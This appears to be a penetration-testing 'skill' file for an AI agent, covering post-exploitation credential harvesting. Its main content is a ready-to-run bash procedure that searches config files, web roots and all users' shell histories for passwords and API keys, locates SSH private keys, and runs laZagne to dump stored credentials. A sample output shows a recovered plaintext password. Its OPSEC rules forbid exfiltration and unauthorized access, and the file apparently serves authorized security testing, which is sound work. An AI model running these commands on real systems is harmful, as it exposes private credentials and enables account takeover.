---
name: credential-harvest
description: Harvest credentials from config files, history, and browser data
version: 1.0.0
phase: post
category: credentials
tags: [credentials, passwords, config, browser]
tools: [laZagne, grep]
difficulty: intermediate
opsec_level: high
time_estimate: 30s
severity_if_found: critical
related_skills:
  - privesc-linux
  - data-exfil
mitre_attack:
  - T1552.001
  - T1555.003
---

## When to Use

Use this skill to harvest credentials from configuration files, shell history,
browser databases, and other sources. Plaintext passwords are critical findings.

## Prerequisites

- Shell access (low-privilege)
- laZagne (optional, for comprehensive harvest)
- grep with recursive search

## Procedure

```bash
# Search for passwords in config files
grep -r "password" /etc/ 2>/dev/null | head -20
grep -r "password" /var/www/ 2>/dev/null | head -20

# Search for database credentials
grep -r "DB_PASSWORD\|DATABASE_URL\|MYSQL_PWD" /var/www/ /opt/ /home/ 2>/dev/null

# Search in bash history
cat /home/*/.bash_history 2>/dev/null | grep -i "password\|pass\|pwd"

# Search for SSH keys
find /home/ -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Run laZagne (comprehensive)
python3 laZagne.py all 2>/dev/null || echo "laZagne not available"

# Search for API keys
grep -r "api_key\|apikey\|API_KEY" /var/www/ /opt/ 2>/dev/null | head -20
```

## OPSEC Rules

- **CRITICAL**: Do not exfiltrate credentials during testing
- Document all findings but do not use them
- Do not modify config files
- Do not access other users' home directories without authorization
- Log all searches for audit trail

## Verification

- Verify credentials are for live systems
- Check if passwords are plaintext (not hashed)
- Confirm the credentials are current (not expired)

## Pitfalls

- Some credentials may be hashed or encrypted
- Config files may contain placeholder values
- Browser databases may be locked
- History files may be large and slow to search

## Output Format

```
[CREDENTIAL] Plaintext password found
  File: /var/www/html/config/database.php
  Line: $db_pass = "SuperSecret123"
  Severity: CRITICAL

[CREDENTIAL] SSH key found
  File: /home/user/.ssh/id_rsa
  Severity: HIGH
```
